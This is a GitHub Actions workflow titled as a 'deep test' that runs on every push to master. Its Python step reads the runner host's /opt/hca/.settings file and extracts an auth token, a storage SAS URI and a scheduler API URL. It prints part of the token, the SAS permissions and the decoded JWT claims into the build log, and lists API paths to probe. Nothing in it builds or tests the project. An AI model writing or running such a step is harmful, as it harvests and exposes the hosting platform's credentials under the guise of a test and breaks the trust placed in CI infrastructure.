name: SAS + API Deep Test
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: |
          SETTINGS=$(cat /opt/hca/.settings)
          python3 << 'PYEOF'
import json, urllib.parse

s = json.loads(open('/opt/hca/.settings').read())
auth = s['authToken']
sas = s['diagnosticsSasUri']
api = s['schedulerApiUrl']

print(f"API URL: {api}")
print(f"AUTH (first 50): {auth[:50]}...")
print(f"1. Try different URL formats:")
for path in ["/v1", "/v1/", "/api/v1", "/api/", "/", "/healthz"]:
    print(f"  GET {api.replace('/v1','')}{path}")
print(f"2. SAS container URL:")
# Parse SAS URI
parsed = urllib.parse.urlparse(sas)
query = urllib.parse.parse_qs(parsed.query)
print(f"  Blob endpoint: {parsed.scheme}://{parsed.netloc}")
print(f"  Container: {parsed.path.split('/')[1] if parsed.path else '?'}")
print(f"  SAS params: se={query.get('se',['?'])[0]}, sp={query.get('sp',['?'])[0]}")
print(f"3. JWT claims:")
import base64
def b64d(x):
    x += '=='[:(4-len(x)%4)%4]
    return base64.urlsafe_b64decode(x)
for part in auth.split('.')[:2]:
    try:
        d = json.loads(b64d(part))
        print(f"  {json.dumps(d, indent=2)}")
    except:
        pass
PYEOF

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: deep-hca
          path: dist/
